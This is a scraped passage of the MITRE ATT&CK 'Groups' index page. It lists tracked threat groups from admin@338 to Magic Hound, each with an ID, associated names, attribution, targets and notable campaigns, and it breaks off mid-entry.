[
{
"id": 53,
"title": "Groups",
"path": "/groups/index.html",
"content": " Groups Groups are activity clusters that are tracked by a common name in the security community. Analysts track these clusters using various analytic methodologies and terms such as threat groups, activity groups, and threat actors. Some groups have multiple names associated with similar activities due to various organizations tracking similar activities by different names. Organizations' group definitions may partially overlap with groups designated by other organizations and may disagree on specific activity. For the purposes of the Group pages, the MITRE ATT&CK team uses the term Group to refer to any of the above designations for an adversary activity cluster. The team makes a best effort to track overlaps between names based on publicly reported associations, which are designated as \u201cAssociated Groups\u201d on each page (formerly labeled \u201cAliases\u201d), because we believe these overlaps are useful for analyst awareness. We do not represent these names as exact overlaps and encourage analysts to do additional research. Groups are mapped to publicly reported technique use and original references are included. The information provided does not represent all possible technique use by Groups, but rather a subset that is available solely through open source reporting. Groups are also mapped to reported Software used and attributed Campaigns, and related techniques for each are tracked separately on their respective pages. Groups: 170 ID Name Associated Groups Description G0018 admin@338 admin@338 is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as PoisonIvy, as well as some non-public backdoors. G1030 Agrius Pink Sandstorm, AMERICIUM, Agonizing Serpens, BlackShadow Agrius is an Iranian threat actor active since 2020 notable for a series of ransomware and wiper operations in the Middle East, with an emphasis on Israeli targets. Public reporting has linked Agrius to Iran's Ministry of Intelligence and Security (MOIS). G0130 Ajax Security Team Operation Woolen-Goldfish, AjaxTM, Rocket Kitten, Flying Kitten, Operation Saffron Rose Ajax Security Team is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 Ajax Security Team transitioned from website defacement operations to malware-based cyber espionage campaigns targeting the US defense industrial base and Iranian users of anti-censorship technologies. G1024 Akira GOLD SAHARA, PUNK SPIDER, Howling Scorpius Akira is a ransomware variant and ransomware deployment entity active since at least March 2023. Akira uses compromised credentials to access single-factor external access mechanisms such as VPNs for initial access, then various publicly-available tools and techniques for lateral movement. Akira operations are associated with \"double extortion\" ransomware activity, where data is exfiltrated from victim environments prior to encryption, with threats to publish files if a ransom is not paid. Technical analysis of Akira ransomware indicates variants capable of targeting Windows or VMWare ESXi hypervisors and multiple overlaps with Conti ransomware. G1000 ALLANITE Palmetto Fusion ALLANITE is a suspected Russian cyber espionage group, that has primarily targeted the electric utility sector within the United States and United Kingdom. The group's tactics and techniques are reportedly similar to Dragonfly, although ALLANITEs technical capabilities have not exhibited disruptive or destructive abilities. It has been suggested that the group maintains a presence in ICS for the purpose of gaining understanding of processes and to maintain persistence. G0138 Andariel Silent Chollima, PLUTONIUM, Onyx Sleet Andariel is a North Korean state-sponsored threat group that has been active since at least 2009. Andariel has primarily focused its operations--which have included destructive attacks--against South Korean government agencies, military organizations, and a variety of domestic companies; they have also conducted cyber financial operations against ATMs, banks, and cryptocurrency exchanges. Andariel's notable activity includes Operation Black Mine, Operation GoldenAxe, and Campaign Rifle. Andariel is considered a sub-set of Lazarus Group, and has been attributed to North Korea's Reconnaissance General Bureau. North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups. G1007 Aoqin Dragon Aoqin Dragon is a suspected Chinese cyber espionage threat group that has been active since at least 2013. Aoqin Dragon has primarily targeted government, education, and telecommunication organizations in Australia, Cambodia, Hong Kong, Singapore, and Vietnam. Security researchers noted a potential association between Aoqin Dragon and UNC94, based on malware, infrastructure, and targets. G1028 APT-C-23 Mantis, Arid Viper, Desert Falcon, TAG-63, Grey Karkadann, Big Bang APT, Two-tailed Scorpion APT-C-23 is a threat group that has been active since at least 2014. APT-C-23 has primarily focused its operations on the Middle East, including Israeli military assets. APT-C-23 has developed mobile spyware targeting Android and iOS devices since 2017. G0099 APT-C-36 Blind Eagle APT-C-36 is a suspected South America espionage group that has been active since at least 2018. The group mainly targets Colombian government institutions as well as important corporations in the financial sector, petroleum industry, and professional manufacturing. G0006 APT1 Comment Crew, Comment Group, Comment Panda APT1 is a Chinese threat group that has been attributed to the 2nd Bureau of the People\u2019s Liberation Army (PLA) General Staff Department\u2019s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398. G0005 APT12 IXESHE, DynCalc, Numbered Panda, DNSCALC APT12 is a threat group that has been attributed to China. The group has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments. G0023 APT16 APT16 is a China-based threat group that has launched spearphishing campaigns targeting Japanese and Taiwanese organizations. G0025 APT17 Deputy Dog APT17 is a China-based threat group that has conducted network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and non-government organizations. G0026 APT18 TG-0416, Dynamite Panda, Threat Group-0416 APT18 is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical. G0073 APT19 Codoso, C0d0so0, Codoso Team, Sunshop Group APT19 is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and legal services. In 2017, a phishing campaign was used to target seven law and investment firms. Some analysts track APT19 and Deep Panda as the same group, but it is unclear from open source information if the groups are the same. G0007 APT28 IRON TWILIGHT, SNAKEMACKEREL, Swallowtail, Group 74, Sednit, Sofacy, Pawn Storm, Fancy Bear, STRONTIUM, Tsar Team, Threat Group-4127, TG-4127, Forest Blizzard, FROZENLAKE, GruesomeLarch APT28 is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165. This group has been active since at least 2004. APT28 reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election. In 2018, the US indicted five GRU Unit 26165 officers associated with APT28 for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations. Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as Sandworm Team. G0016 APT29 IRON RITUAL, IRON HEMLOCK, NobleBaron, Dark Halo, NOBELIUM, UNC2452, YTTRIUM, The Dukes, Cozy Bear, CozyDuke, SolarStorm, Blue Kitsune, UNC3524, Midnight Blizzard APT29 is threat group that has been attributed to Russia's Foreign Intelligence Service (SVR). They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. APT29 reportedly compromised the Democratic National Committee starting in the summer of 2015. In April 2021, the US and UK governments attributed the SolarWinds Compromise to the SVR; public statements included citations to APT29, Cozy Bear, and The Dukes. Industry reporting also referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm. G0022 APT3 Gothic Panda, Pirpi, UPS Team, Buckeye, Threat Group-0110, TG-0110 APT3 is a China-based threat group that researchers have attributed to China's Ministry of State Security. This group is responsible for the campaigns known as Operation Clandestine Fox, Operation Clandestine Wolf, and Operation Double Tap. As of June 2015, the group appears to have shifted from targeting primarily US victims to primarily political organizations in Hong Kong. G0013 APT30 APT30 is a threat group suspected to be associated with the Chinese government. While Naikon shares some characteristics with APT30, the two groups do not appear to be exact matches. G0050 APT32 SeaLotus, OceanLotus, APT-C-00, Canvas Cyclone, BISMUTH APT32 is a suspected Vietnam-based threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as foreign governments, dissidents, and journalists with a strong focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. They have extensively used strategic web compromises to compromise victims. G0064 APT33 HOLMIUM, Elfin, Peach Sandstorm APT33 is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. G0067 APT37 InkySquid, ScarCruft, Reaper, Group123, TEMP.Reaper, Ricochet Chollima APT37 is a North Korean state-sponsored cyber espionage group that has been active since at least 2012. The group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East. APT37 has also been linked to the following campaigns between 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, North Korean Human Rights, and Evil New Year 2018. North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups. G0082 APT38 NICKEL GLADSTONE, BeagleBoyz, Bluenoroff, Stardust Chollima, Sapphire Sleet, COPERNICIUM APT38 is a North Korean state-sponsored threat group that specializes in financial cyber operations; it has been attributed to the Reconnaissance General Bureau. Active since at least 2014, APT38 has targeted banks, financial institutions, casinos, cryptocurrency exchanges, SWIFT system endpoints, and ATMs in at least 38 countries worldwide. Significant operations include the 2016 Bank of Bangladesh heist, during which APT38 stole $81 million, as well as attacks against Bancomext and Banco de Chile ; some of their attacks have been destructive. North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups. G0087 APT39 ITG07, Chafer, Remix Kitten APT39 is one of several names for cyber espionage activity conducted by the Iranian Ministry of Intelligence and Security (MOIS) through the front company Rana Intelligence Computing since at least 2014. APT39 has primarily targeted the travel, hospitality, academic, and telecommunications industries in Iran and across Asia, Africa, Europe, and North America to track individuals and entities considered to be a threat by the MOIS. G0096 APT41 Wicked Panda, Brass Typhoon, BARIUM APT41 is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, APT41 has been observed targeting various industries, including but not limited to healthcare, telecom, technology, finance, education, retail and video game industries in 14 countries. Notable behaviors include using a wide range of malware and tools to complete mission objectives. APT41 overlaps at least partially with public reporting on groups including BARIUM and Winnti Group. G1044 APT42 APT42 is an Iranian-sponsored threat group that conducts cyber espionage and surveillance. The group primarily focuses on targets in the Middle East region, but has targeted a variety of industries and countries since at least 2015. APT42 starts cyber operations through spearphishing emails and/or the PINEFLOWER Android malware, then monitors and collects information from the compromised systems and devices. Finally, APT42 exfiltrates data using native features and open-source tools. APT42 activities have been linked to Magic Hound by other commercial vendors. While there are behavior and software overlaps between Magic Hound and APT42, they appear to be distinct entities and are tracked as separate entities by their originating vendor. G1023 APT5 Mulberry Typhoon, MANGANESE, BRONZE FLEETWOOD, Keyhole Panda, UNC2630 APT5 is a China-based espionage actor that has been active since at least 2007 primarily targeting the telecommunications, aerospace, and defense industries throughout the U.S., Europe, and Asia. APT5 has displayed advanced tradecraft and significant interest in compromising networking devices and their underlying software including through the use of zero-day exploits. G0143 Aquatic Panda Aquatic Panda is a suspected China-based threat group with a dual mission of intelligence collection and industrial espionage. Active since at least May 2020, Aquatic Panda has primarily targeted entities in the telecommunications, technology, and government sectors. G0001 Axiom Group 72 Axiom is a suspected Chinese cyber espionage group that has targeted the aerospace, defense, government, manufacturing, and media sectors since at least 2008. Some reporting suggests a degree of overlap between Axiom and Winnti Group but the two groups appear to be distinct based on differences in reporting on TTPs and targeting. G0135 BackdoorDiplomacy BackdoorDiplomacy is a cyber espionage threat group that has been active since at least 2017. BackdoorDiplomacy has targeted Ministries of Foreign Affairs and telecommunication companies in Africa, Europe, the Middle East, and Asia. G1002 BITTER T-APT-17 BITTER is a suspected South Asian cyber espionage threat group that has been active since at least 2013. BITTER has targeted government, energy, and engineering organizations in Pakistan, China, Bangladesh, and Saudi Arabia. G1043 BlackByte Hecamede BlackByte is a ransomware threat actor operating since at least 2021. BlackByte is associated with several versions of ransomware also labeled BlackByte Ransomware. BlackByte ransomware operations initially used a common encryption key allowing for the development of a universal decryptor, but subsequent versions such as BlackByte 2.0 Ransomware use more robust encryption mechanisms. BlackByte is notable for operations targeting critical infrastructure entities among other targets across North America. G0063 BlackOasis BlackOasis is a Middle Eastern threat group that is believed to be a customer of Gamma Group. The group has shown interest in prominent figures in the United Nations, as well as opposition bloggers, activists, regional news correspondents, and think tanks. A group known by Microsoft as NEODYMIUM is reportedly associated closely with BlackOasis operations, but evidence that the group names are aliases has not been identified. G0098 BlackTech Palmerworm BlackTech is a suspected Chinese cyber espionage group that has primarily targeted organizations in East Asia--particularly Taiwan, Japan, and Hong Kong--and the US since at least 2013. BlackTech has used a combination of custom malware, dual-use tools, and living off the land tactics to compromise media, construction, engineering, electronics, and financial company networks. G0108 Blue Mockingbird Blue Mockingbird is a cluster of observed activity involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. The earliest observed Blue Mockingbird tools were created in December 2019. G0097 Bouncing Golf Bouncing Golf is a cyberespionage campaign targeting Middle Eastern countries. G0060 BRONZE BUTLER REDBALDKNIGHT, Tick BRONZE BUTLER is a cyber espionage group with likely Chinese origins that has been active since at least 2008. The group primarily targets Japanese organizations, particularly those in government, biotechnology, electronics manufacturing, and industrial chemistry. G0008 Carbanak Anunak Carbanak is a cybercriminal group that has used Carbanak malware to target financial institutions since at least 2013. Carbanak may be linked to groups tracked separately as Cobalt Group and FIN7 that have also used Carbanak malware. G0114 Chimera Chimera is a suspected China-based threat group that has been active since at least 2018 targeting the semiconductor industry in Taiwan as well as data from the airline industry. G1021 Cinnamon Tempest DEV-0401, Emperor Dragonfly, BRONZE STARLIGHT Cinnamon Tempest is a China-based threat group that has been active since at least 2021 deploying multiple strains of ransomware based on the leaked Babuk source code. Cinnamon Tempest does not operate their ransomware on an affiliate model or purchase access but appears to act independently in all stages of the attack lifecycle. Based on victimology, the short lifespan of each ransomware variant, and use of malware attributed to government-sponsored threat groups, Cinnamon Tempest may be motivated by intellectual property theft or cyberespionage rather than financial gain. G0003 Cleaver Threat Group 2889, TG-2889 Cleaver is a threat group that has been attributed to Iranian actors and is responsible for activity tracked as Operation Cleaver. Strong circumstantial evidence suggests Cleaver is linked to Threat Group 2889 (TG-2889). G0080 Cobalt Group GOLD KINGSWOOD, Cobalt Gang, Cobalt Spider Cobalt Group is a financially motivated threat group that has primarily targeted financial institutions since at least 2016. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems. Cobalt Group has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims. Reporting indicates there may be links between Cobalt Group and both the malware Carbanak and the group Carbanak. G0142 Confucius Confucius APT Confucius is a cyber espionage group that has primarily targeted military personnel, high-profile personalities, business persons, and government organizations in South Asia since at least 2013. Security researchers have noted similarities between Confucius and Patchwork, particularly in their respective custom malware code and targets. G0052 CopyKittens CopyKittens is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip. G1012 CURIUM Crimson Sandstorm, TA456, Tortoise Shell, Yellow Liderc CURIUM is an Iranian threat group, first reported in September 2019 and active since at least July 2018, targeting IT service providers in the Middle East. CURIUM has since invested in building relationships with potential targets via social media over a period of months to establish trust and confidence before sending malware. Security researchers note CURIUM has demonstrated great patience and persistence by chatting with potential targets daily and sending benign files to help lower their security consciousness. G1027 CyberAv3ngers Soldiers of Soloman The CyberAv3ngers are a suspected Iranian Government Islamic Revolutionary Guard Corps (IRGC)-affiliated APT group. The CyberAv3ngers have been known to be active since at least 2020, with disputed and false claims of critical infrastructure compromises in Israel. In 2023, the CyberAv3ngers engaged in a global targeting and hacking of the Unitronics Programmable Logic Controller (PLC) with Human-Machine Interface (HMI). This PLC can be found in multiple sectors, including water and wastewater, energy, food and beverage manufacturing, and healthcare. The most notable feature of this attack was the defacement of the devices user interface. G1034 Daggerfly Evasive Panda, BRONZE HIGHLAND Daggerfly is a People's Republic of China-linked APT entity active since at least 2012. Daggerfly has targeted individuals, government and NGO entities, and telecommunication companies in Asia and Africa. Daggerfly is associated with exclusive use of MgBot malware and is noted for several potential supply chain infection campaigns. G0070 Dark Caracal Dark Caracal is threat group that has been attributed to the Lebanese General Directorate of General Security (GDGS) and has operated since at least 2012. G0012 Darkhotel DUBNIUM, Zigzag Hail Darkhotel is a suspected South Korean threat group that has targeted victims primarily in East Asia since at least 2004. The group's name is based on cyber espionage operations conducted via hotel Internet networks against traveling executives and other select guests. Darkhotel has also conducted spearphishing campaigns and infected victims through peer-to-peer and file sharing networks. G0079 DarkHydrus DarkHydrus is a threat group that has targeted government agencies and educational institutions in the Middle East since at least 2016. The group heavily leverages open-source tools and custom payloads for carrying out attacks. G0105 DarkVishnya DarkVishnya is a financially motivated threat actor targeting financial institutions in Eastern Europe. In 2017-2018 the group attacked at least 8 banks in this region. G0009 Deep Panda Shell Crew, WebMasters, KungFu Kittens, PinkPanther, Black Vine Deep Panda is a suspected Chinese threat group known to target many industries, including government, defense, financial, and telecommunications. The intrusion into healthcare company Anthem has been attributed to Deep Panda. This group is also known as Shell Crew, WebMasters, KungFu Kittens, and PinkPanther. Deep Panda also appears to be known as Black Vine based on the attribution of both group names to the Anthem intrusion. Some analysts track Deep Panda and APT19 as the same group, but it is unclear from open source information if the groups are the same. G0035 Dragonfly TEMP.Isotope, DYMALLOY, Berserk Bear, TG-4192, Crouching Yeti, IRON LIBERTY, Energetic Bear, Ghost Blizzard, BROMINE Dragonfly is a cyber espionage group that has been attributed to Russia's Federal Security Service (FSB) Center 16. Active since at least 2010, Dragonfly has targeted defense and aviation companies, government entities, companies related to industrial control systems, and critical infrastructure sectors worldwide through supply chain, spearphishing, and drive-by compromise attacks. G0017 DragonOK DragonOK is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools, DragonOK is thought to have a direct or indirect relationship with the threat group Moafee. It is known to use a variety of malware, including Sysget/HelloBridge, PlugX, PoisonIvy, FormerFirstRat, NFlog, and NewCT. G1006 Earth Lusca TAG-22, Charcoal Typhoon, CHROMIUM, ControlX Earth Lusca is a suspected China-based cyber espionage group that has been active since at least April 2019. Earth Lusca has targeted organizations in Australia, China, Hong Kong, Mongolia, Nepal, the Philippines, Taiwan, Thailand, Vietnam, the United Arab Emirates, Nigeria, Germany, France, and the United States. Targets included government institutions, news media outlets, gambling companies, educational institutions, COVID-19 research organizations, telecommunications companies, religious movements banned in China, and cryptocurrency trading platforms; security researchers assess some Earth Lusca operations may be financially motivated. Earth Lusca has used malware commonly used by other Chinese threat groups, including APT41 and the Winnti Group cluster, however security researchers assess Earth Lusca's techniques and infrastructure are separate. G0066 Elderwood Elderwood Gang, Beijing Group, Sneaky Panda Elderwood is a suspected Chinese cyber espionage group that was reportedly responsible for the 2009 Google intrusion known as Operation Aurora. The group has targeted defense organizations, supply chain manufacturers, human rights and nongovernmental organizations (NGOs), and IT service providers. G1003 Ember Bear UNC2589, Bleeding Bear, DEV-0586, Cadet Blizzard, Frozenvista, UAC-0056 Ember Bear is a Russian state-sponsored cyber espionage group that has been active since at least 2020, linked to Russia's General Staff Main Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155). Ember Bear has primarily focused operations against Ukrainian government and telecommunication entities, but has also operated against critical infrastructure entities in Europe and the Americas. Ember Bear conducted the WhisperGate destructive wiper attacks against Ukraine in early 2022. There is some confusion as to whether Ember Bear overlaps with another Russian-linked entity referred to as Saint Bear. At present available evidence strongly suggests these are distinct activities with different behavioral profiles. G0020 Equation Equation is a sophisticated threat group that employs multiple remote access tools. The group is known to use zero-day exploits and has developed the capability to overwrite the firmware of hard disk drives. G0120 Evilnum Evilnum is a financially motivated threat group that has been active since at least 2018. G1011 EXOTIC LILY EXOTIC LILY is a financially motivated group that has been closely linked with Wizard Spider and the deployment of ransomware including Conti and Diavol. EXOTIC LILY may be acting as an initial access broker for other malicious actors, and has targeted a wide range of industries including IT, cybersecurity, and healthcare since at least September 2021. G0137 Ferocious Kitten Ferocious Kitten is a threat group that has primarily targeted Persian-speaking individuals in Iran since at least 2015. G0051 FIN10 FIN10 is a financially motivated threat group that has targeted organizations in North America since at least 2013 through 2016. The group uses stolen data exfiltrated from victims to extort organizations. G1016 FIN13 Elephant Beetle FIN13 is a financially motivated cyber threat group that has targeted the financial, retail, and hospitality industries in Mexico and Latin America, as early as 2016. FIN13 achieves its objectives by stealing intellectual property, financial data, mergers and acquisition information, or PII. G0085 FIN4 FIN4 is a financially-motivated threat group that has targeted confidential information related to the public financial market, particularly regarding healthcare and pharmaceutical companies, since at least 2013. FIN4 is unique in that they do not infect victims with typical persistent malware, but rather they focus on capturing credentials authorized to access email and other non-public correspondence. G0053 FIN5 FIN5 is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the restaurant, gaming, and hotel industries. The group is made up of actors who likely speak Russian. G0037 FIN6 Magecart Group 6, ITG08, Skeleton Spider, TAAL, Camouflage Tempest FIN6 is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems in the hospitality and retail sectors. G0046 FIN7 GOLD NIAGARA, ITG14, Carbon Spider, ELBRUS, Sangria Tempest FIN7 is a financially-motivated threat group that has been active since 2013. FIN7 has primarily targeted the retail, restaurant, hospitality, software, consulting, financial services, medical equipment, cloud services, media, food and beverage, transportation, and utilities industries in the U.S. A portion of FIN7 was run out of a front company called Combi Security and often used point-of-sale malware for targeting efforts. Since 2020, FIN7 shifted operations to a big game hunting (BGH) approach including use of REvil ransomware and their own Ransomware as a Service (RaaS), Darkside. FIN7 may be linked to the Carbanak Group, but there appears to be several groups using Carbanak malware and are therefore tracked separately. G0061 FIN8 Syssphinx FIN8 is a financially motivated threat group that has been active since at least January 2016, and known for targeting organizations in the hospitality, retail, entertainment, insurance, technology, chemical, and financial sectors. In June 2021, security researchers detected FIN8 switching from targeting point-of-sale (POS) devices to distributing a number of ransomware variants. G0117 Fox Kitten UNC757, Parisite, Pioneer Kitten, RUBIDIUM, Lemon Sandstorm Fox Kitten is threat actor with a suspected nexus to the Iranian government that has been active since at least 2017 against entities in the Middle East, North Africa, Europe, Australia, and North America. Fox Kitten has targeted multiple industrial verticals including oil and gas, technology, government, defense, healthcare, manufacturing, and engineering. G0093 GALLIUM Granite Typhoon GALLIUM is a cyberespionage group that has been active since at least 2012, primarily targeting telecommunications companies, financial institutions, and government entities in Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia, and Vietnam. This group is particularly known for launching Operation Soft Cell, a long-term campaign targeting telecommunications providers. Security researchers have identified GALLIUM as a likely Chinese state-sponsored group, based in part on tools used and TTPs commonly associated with Chinese threat actors. G0084 Gallmaker Gallmaker is a cyberespionage group that has targeted victims in the Middle East and has been active since at least December 2017. The group has mainly targeted victims in the defense, military, and government sectors. G0047 Gamaredon Group IRON TILDEN, Primitive Bear, ACTINIUM, Armageddon, Shuckworm, DEV-0157, Aqua Blizzard Gamaredon Group is a suspected Russian cyber espionage threat group that has targeted military, NGO, judiciary, law enforcement, and non-profit organizations in Ukraine since at least 2013. The name Gamaredon Group comes from a misspelling of the word \"Armageddon\", which was detected in the adversary's early campaigns. In November 2021, the Ukrainian government publicly attributed Gamaredon Group to Russia's Federal Security Service (FSB) Center 18. G0036 GCMAN GCMAN is a threat group that focuses on targeting banks for the purpose of transferring money to e-currency services. G0115 GOLD SOUTHFIELD Pinchy Spider GOLD SOUTHFIELD is a financially motivated threat group active since at least 2018 that operates the REvil Ransomware-as-a Service (RaaS). GOLD SOUTHFIELD provides backend infrastructure for affiliates recruited on underground forums to perpetrate high value deployments. By early 2020, GOLD SOUTHFIELD started capitalizing on the new trend of stealing data and further extorting the victim to pay for their data to not get publicly leaked. G0078 Gorgon Group Gorgon Group is a threat group consisting of members who are suspected to be Pakistan-based or have other connections to Pakistan. The group has performed a mix of criminal and targeted attacks, including campaigns against government organizations in the United Kingdom, Spain, Russia, and the United States. G0043 Group5 Group5 is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. Group5 has used two commonly available remote access tools (RATs), njRAT and NanoCore, as well as an Android RAT, DroidJack. G0125 HAFNIUM Operation Exchange Marauder, Silk Typhoon HAFNIUM is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. HAFNIUM primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs. HAFNIUM has targeted remote management tools and cloud software for intial access and has demonstrated an ability to quickly operationalize exploits for identified vulnerabilities in edge devices. G1001 HEXANE Lyceum, Siamesekitten, Spirlin HEXANE is a cyber espionage threat group that has targeted oil & gas, telecommunications, aviation, and internet service provider organizations since at least 2017. Targeted companies have been located in the Middle East and Africa, including Israel, Saudi Arabia, Kuwait, Morocco, and Tunisia. HEXANE's TTPs appear similar to APT33 and OilRig but due to differences in victims and tools it is tracked as a separate entity. G0126 Higaisa Higaisa is a threat group suspected to have South Korean origins. Higaisa has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. Higaisa was first disclosed in early 2019 but is assessed to have operated as early as 2009. G1032 INC Ransom GOLD IONIC INC Ransom is a ransomware and data extortion threat group associated with the deployment of INC Ransomware that has been active since at least July 2023. INC Ransom has targeted organizations worldwide most commonly in the industrial, healthcare, and education sectors in the US and Europe. G0100 Inception Inception Framework, Cloud Atlas Inception is a cyber espionage group active since at least 2014. The group has targeted multiple industries and governmental entities primarily in Russia, but has also been active in the United States and throughout Europe, Asia, Africa, and the Middle East. G0136 IndigoZebra IndigoZebra is a suspected Chinese cyber espionage group that has been targeting Central Asian governments since at least 2014. G0119 Indrik Spider Evil Corp, Manatee Tempest, DEV-0243, UNC2165 Indrik Spider is a Russia-based cybercriminal group that has been active since at least 2014. Indrik Spider initially started with the Dridex banking Trojan, and then by 2017 they began running ransomware operations using BitPaymer, WastedLocker, and Hades ransomware. Following U.S. sanctions and an indictment in 2019, Indrik Spider changed their tactics and diversified their toolset. G0004 Ke3chang APT15, Mirage, Vixen Panda, GREF, Playful Dragon, RoyalAPT, NICKEL, Nylon Typhoon Ke3chang is a threat group attributed to actors operating out of China. Ke3chang has targeted oil, government, diplomatic, military, and NGOs in Central and South America, the Caribbean, Europe, and North America since at least 2010. G0094 Kimsuky Black Banshee, Velvet Chollima, Emerald Sleet, THALLIUM, APT43, TA427, Springtail Kimsuky is a North Korea-based cyber espionage group that has been active since at least 2012. The group initially focused on targeting South Korean government entities, think tanks, and individuals identified as experts in various fields, and expanded its operations to include the UN and the government, education, business services, and manufacturing sectors in the United States, Japan, Russia, and Europe. Kimsuky has focused its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions. Kimsuky operations have overlapped with those of other North Korean cyber espionage actors likely as a result of ad hoc collaborations or other limited resource sharing. Kimsuky was assessed to be responsible for the 2014 Korea Hydro & Nuclear Power Co. compromise; other notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), and Operation Smoke Screen (2019). North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups. In 2023, Kimsuky has used commercial large language models to assist with vulnerability research, scripting, social engineering and reconnaissance. G1004 LAPSUS$ DEV-0537, Strawberry Tempest LAPSUS$ is cyber criminal threat group that has been active since at least mid-2021. LAPSUS$ specializes in large-scale social engineering and extortion operations, including destructive attacks without the use of ransomware. The group has targeted organizations globally, including in the government, manufacturing, higher education, energy, healthcare, technology, telecommunications, and media sectors. G0032 Lazarus Group Labyrinth Chollima, HIDDEN COBRA, Guardians of Peace, ZINC, NICKEL ACADEMY, Diamond Sleet Lazarus Group is a North Korean state-sponsored cyber threat group that has been attributed to the Reconnaissance General Bureau. The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by Lazarus Group correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain. North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups, such as Andariel, APT37, APT38, and Kimsuky. G0140 LazyScripter LazyScripter is threat group that has mainly targeted the airlines industry since at least 2018, primarily using open-source toolsets. G0077 Leafminer Raspite Leafminer is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. G0065 Leviathan MUDCARP, Kryptonite Panda, Gadolinium, BRONZE MOHAWK, TEMP.Jumper, APT40, TEMP.Periscope, Gingham Typhoon Leviathan is a Chinese state-sponsored cyber espionage group that has been attributed to the Ministry of State Security's (MSS) Hainan State Security Department and an affiliated front company. Active since at least 2009, Leviathan has targeted the following sectors: academia, aerospace/aviation, biomedical, defense industrial base, government, healthcare, manufacturing, maritime, and transportation across the US, Canada, Australia, Europe, the Middle East, and Southeast Asia. G0030 Lotus Blossom DRAGONFISH, Spring Dragon, RADIUM, Raspberry Typhoon, Bilbug, Thrip Lotus Blossom is a long-standing threat group largely targeting various entities in Asia since at least 2009. In addition to government and related targets, Lotus Blossom has also targeted entities such as digital certificate issuers. G1014 LuminousMoth LuminousMoth is a Chinese-speaking cyber espionage group that has been active since at least October 2020. LuminousMoth has targeted high-profile organizations, including government entities, in Myanmar, the Philippines, Thailand, and other parts of Southeast Asia. Some security researchers have concluded there is a connection between LuminousMoth and Mustang Panda based on similar targeting and TTPs, as well as network infrastructure overlaps. G0095 Machete APT-C-43, El Machete Machete is a suspected Spanish-speaking cyber espionage group that has been active since at least 2010. It has primarily focused its operations within Latin America, with a particular emphasis on Venezuela, but also in the US, Europe, Russia, and parts of Asia. Machete generally targets high-profile organizations such as government institutions, intelligence services, and military units, as well as telecommunications and power companies. G0059 Magic Hound TA453, COBALT ILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster, APT35, Mint Sandstorm Magic Hound is an Iranian-sponsored threat group that conducts long term, 